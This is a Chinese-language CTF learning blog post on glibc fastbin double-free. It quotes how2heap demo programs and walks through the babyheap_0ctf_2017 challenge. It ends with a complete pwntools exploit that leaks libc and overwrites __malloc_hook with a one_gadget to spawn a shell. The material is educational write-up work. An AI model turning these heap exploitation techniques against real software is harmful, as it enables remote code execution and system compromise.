---
title:   fastbin二次释放——学pwn小记(5)
categories: [CTF]
tags: [pwn]

---


在学习pwn时,在接触到堆的知识点时明显感觉自己遇到了瓶颈了。面对各种bin、chunk、glibc感觉一脸蒙蔽,有的感觉不到如何将这些知识用到题目中来.感觉从how2heap学到知识和ctfwiki的知识及pwn爷爷们的python exp代码有的连不上.(tcl!)就这样迷茫了几个月,偶然间在拜读《CTF 竞赛权威指南 pwn篇》的fastbin二次释放时，突然有顿悟，故做个小笔记。（萌新写作欢迎pwn佬指点）

<!-- more -->


##  fastbin 知识点

### chunk 与bin 

chunk 是glibc 管理内存的基本单位.整个堆在初始化后会被当成一个free chunk,成为top chunk.用户在分配内存时,如果没有bins没有合适的chunk就会在top chunk中分配.在释放内存时,glibc会视情况将释放的chunk与相邻free chunk合并加入合适的bin中 .

bin是glibc将被释放掉的chunk(free chunk) 重新组织起来的**链表**.当用户请求新内存时,会先分配bin 链表中合适chunk.bin一共有4种 Fast bin 、 Small bin 、Large bin 、Unsertd bin。

### fastbin 

astbin的chunksize为16到80字节，在内存分配和释放中，fastbin是速度最快的。fastbin的两个特点：
1、fastbin的个数为10个。
2、fastbin由单链表构成，无论是添加还是移除fastchunk，都对链表尾进行操作，采取后入先出算法。fastbinsY数组中每个fastbin元素均指向了该链表的rear end（尾结点），而尾结点通过其fd指针指向前一个结点。如图所示：

![image-20210312105700389](image-20210312105700389.png)

### fastbin二次释放

成因：fastbin是单链表结构，当chunk 释放时不会清空next chunk 的prev_inuse.

作用：获得fd指针、修改任意位置chunk

利用条件：可以控制chunk里的内容。



#### fastbin_dup

由于fastbin_dup 的检测机制仅仅验证了当前块是否有与链表头的块相同及当前块size部大小是否与链表头的size部大小相同。因此我们可以free 两个相同大小chunk 再free 第一个被free的chunk 从而绕过检测。（fastbin 是后入先出算法的）

借用how2heap的fastbin_dup c语言代码来描述这个过程：

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple double-free attack with fastbins.\n");

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
	a = malloc(8);
	b = malloc(8);
	c = malloc(8);
	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	assert(a == c);
}
```

gdb这个过程，执行到代码19行时，chunk a 进入fastbin ，根据fastbin特性chunk a成为fastbin的表头。

![image-20210312114855200](image-20210312114855200.png)

执行到代码25行时，chunk b 进入fastbin ，根据fastbin特性chunk b成为fastbin的表头。

![image-20210312115643868](image-20210312115643868.png)

执行到代码28行时，我们再次free a ，可以看到chunk a再次被释放成为fastbin的表头。

![image-20210312120347309](image-20210312120347309.png)

看到此时chunk a 的fd指向chunk b ，chunk b 的fd指向chunk a。这样我们 无论申请多少chunk其指针都会是chunk a 的指针和chunk b的指针之间。

#### fastbin_dup_consolidate

同时，libc 在分配large chunk时，如果fastbins不为空则会调用malloc_consolidate函数合并fastbin到chunk并放入 unsorted bin。再将合并后的chunk 取出放到合适的bins中。此时fastbin会被清空。

借用how2heap的fastbin_dup_consolidate c语言代码来描述这个过程：

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```

执行到代码10行时，chunk a 进入fastbin。 

![image-20210312134616539](image-20210312134616539.png)

执行到代码12行时，申请了一块符合large chunk大小的内存，fastbin被初始化。

![image-20210312134851373](image-20210312134851373.png)

执行到代码15行时，我们再次free chunk a ，我们发现fastbin中再次出现chunk a。

![image-20210312135411880](image-20210312135411880.png)

再次申请内存时，我们获得两个指向同一个地方的chunk（同一个值的指针）

#### fastbin_dup_into_stack

由于fastbin检测不严谨导致我们可以伪造一个假fastbin来欺骗glibc。

借用how2heap的fastbin_dup_into_stack c语言代码来描述这个过程：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

这个代码32行前过程是fastin_dup的过程。

45到48行是伪造一个fake chunk的过错，伪造后内存如下:。

![image-20210312142027606](image-20210312142027606.png)

此时真实的chunk处状况：

![image-20210312142236414](image-20210312142236414.png)

这样我们就伪造一个chunk在fast bin中：

![image-20210312142636361](image-20210312142636361.png)

## 例题：babyheap_0ctf_2017



### 学堆溢出疑问

在我学习堆时，困扰我的问题主要有以下几个：

how2heap中的c语言的漏洞，怎么通过python脚本来复现利用？

怎么泄露程序的libc版本？

如何写恶意代码？

在哪里写恶意代码?

如何让程序执行写入的恶意代码?

### 解题过程

#### 程序过程分析

![image-20210312161854321](image-20210312161854321.png)

发现题目所有保护全开.

看ida发现程序有4个功能:



![image-20210312161652601](image-20210312161652601.png)

##### allcocate

allcocate 功能伪代码如下:

![image-20210312162822749](image-20210312162822749.png)

主要是创造最多16个结构体,.每个结构体分配我们输入大小的内存(若大于0x1000则只分配0x1000).在创造一个结构体时,结构体的第一个参数会变为1,第二个参数为分配内存的大小,第三个参数为分配内存.

##### Fill

Fill 功能伪代码如下:

![image-20210312163722236](image-20210312163722236.png)

主要是让我们选择一个结构体，然后检测结构体是否被创造（第一个参数是否为1）。若第一个参数为1则然调用sub_11B2（）函数，让我们输入内容写入该结构体。

sub_11B2函数伪代码如下：

![image-20210312164154599](image-20210312164154599.png)

发现只限制了，输入的数符数量为传入sub_11B2的第二个参数。没有管字符串是否导致溢出。

##### Free

Free功能伪代码如下:

![image-20210312164403684](image-20210312164403684.png)

发现在释放结构体时，程序会先检测输入数字是否符合规范。然后检测是否被释放，符合要求后才释放内存，再将第一个和第二个参数清零。

##### Dump

Dump功能伪代码如下：

![image-20210312165151718](image-20210312165151718.png)

大致就是将我们输入的字符打印出来。

#### 解题思路

大致思路是leak出gbilc版本，写入shell ，让glibc调用。

##### leak 

我们知道释放的chunk 会回到bins 中会有fd与bk指针指向libc中的地址，这个地址与libc的基地址是相对不变的。因此我们可以利用一个fast chunk和一个small chunk 指向一个地方,然后释放small chunk,用另一 读取地址.

我们先free掉两个fast chunk，利用堆溢出强行让第二个fast chunk fd指向small chunk,,再修改small chunk大小为0x21.

![image-20210312185816110](image-20210312185816110.png)

这样再申请fast chunk内存，第二个new fast chunk就 指向small chunk。

![image-20210312190219655](image-20210312190219655.png)

再利用堆溢出将small chunk大小改回0x91。在free掉small chunk，此时small chunk fd与 bk指向libc中映射的地址。再利用指向同一个地方的new fast chunk读出来。

![image-20210312191817225](image-20210312191817225.png)

然后算出这固定偏移。

![image-20210312192631389](image-20210312192631389.png)

##### get shell

爆出glibc后剩下的问题就是如何写入shell和调用shell。

对于写入shell我们可以就用one_gadget,调用我们可以通过伪造一个fake  chunk复写__malloc_hook来触发。

（ps：`__malloc_hook` 是一个弱类型的函数指针，指向 `void *function（size_t size ,void *caller ）`,在调用malloc函数是会判断`__malloc_hook`是否为空，不为空则调用它）

我们通过错位偏移的方法在__malloc_hook附近伪造一个fake  chunk

![image-20210312195128925](image-20210312195128925.png)

再利用堆溢出，在__malloc_hook位置写入one_gadget。

![image-20210312195737780](image-20210312195737780.png)

这样程序在创建一个新chunk时，会自动调用__malloc_hook位置对应的one_gadget。

![image-20210312195837505](image-20210312195837505.png)

### 完整exp

```python
from pwn import *

e=ELF('./babyheap')
p=process('./babyheap')
#p=remote('node3.buuoj.cn',26886)
#process('./babyheap')


def alloc(size):
	p.sendline('1')
	p.sendline(str(size))

def fill(num,text):
	p.sendline('2')
	p.sendline(str(num))
	p.sendline(str(len(text)))
	p.sendline(str(text))

def free(num):
	p.sendline('3')
	p.sendline(str(num))

def dump(num):
	
	p.sendline('4')
	p.sendline(str(num))
	x=p.recvuntil('Content: \n')
	
	return p.recv()




def fast():
       
	alloc(0x10) #0
	alloc(0x10) #1
	alloc(0x10) #2
	alloc(0x10) #3
	alloc(0x80) #4
        
	free(1)
	free(2)
	
	pay=0x10*'a'
	pay+=p64(0)+p64(0x21)
	pay+=p64(0x88)+p64(0x88)
        pay+=p64(0)+p64(0x21) 
        pay+=p8(0x80)
	fill('0',pay)
	
	pay='a'*0x10
	pay+=p64(0)+p64(0x21)
	fill('3',pay)

	alloc(0x10) #1
	alloc(0x10) #2
	fill(1,'aaaa')
	fill(2,'bbbb')
	#free(1)
	#free(2)

	#gdb.attach(p)

def leak():
	global base,malloc_hook
	pay=p64(0)*3+p64(0x91)
	fill('3',pay)
	alloc(0x80) #5
	free(4)
	
	addr=u64(dump(2)[:8])
	print(addr)
	base=addr-0x3c4b78
	malloc_hook=base+0x3c4b10
	log.info("libc_base: "+hex(base))
	log.info("malloc_hook:"+hex(malloc_hook))	
 	
def pwn():
	alloc(0x60) #4
	free(4)
	fill('2',p64(malloc_hook-0x30+0xd))
	
	alloc(0x60)#4
	
	alloc(0x60) #fake
	one=base+0x4526a #one_gadget
	fill('6',p8(0)*3+p64(0)*2+p64(one))
	#gdb.attach(p)
	alloc(0x60)

fast()
leak()
pwn()
p.interactive()
```



## 后记

在查阅众多资料后，虽然通过one_gadget做出babyheap_0ctf_2017了，但也算是勉强摸到fastbin及堆的门道（吧？）前途漫漫，关于堆上如何自己写shell还待学习。关于修改`__realloc_hook`和`__free_hook`来调用shell的方法须了解。还有更多的堆漏洞还要复习。

## 参看文献

https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/

https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html

https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.10_pwn_0ctf2017_babyheap2017.html

《CTF 竞赛权威指南 pwn篇》

